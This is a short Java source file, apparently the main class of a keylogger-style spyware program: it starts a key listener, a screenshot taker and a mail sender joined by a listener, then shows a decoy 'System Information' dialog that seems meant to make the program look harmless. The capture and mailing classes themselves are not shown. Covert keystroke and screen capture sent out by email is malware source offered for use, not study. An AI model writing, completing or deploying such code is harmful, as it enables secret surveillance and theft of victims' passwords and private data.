import javax.swing.JOptionPane;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;

public class Drive {
	
	public static void main(String[] args) {
		MyKeyListener myKeyListener = new MyKeyListener();
		MailSender mailSender = new MailSender();
		ScreenTaker screenTaker = new ScreenTaker();
		Listen listen = new Listen(mailSender, screenTaker);
		new Drive().showMsg();
	}	
	
	public void showMsg(){
		try {
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InstantiationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (UnsupportedLookAndFeelException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		JOptionPane.showMessageDialog(null, "System Information", "Application", JOptionPane.INFORMATION_MESSAGE);
	}
}
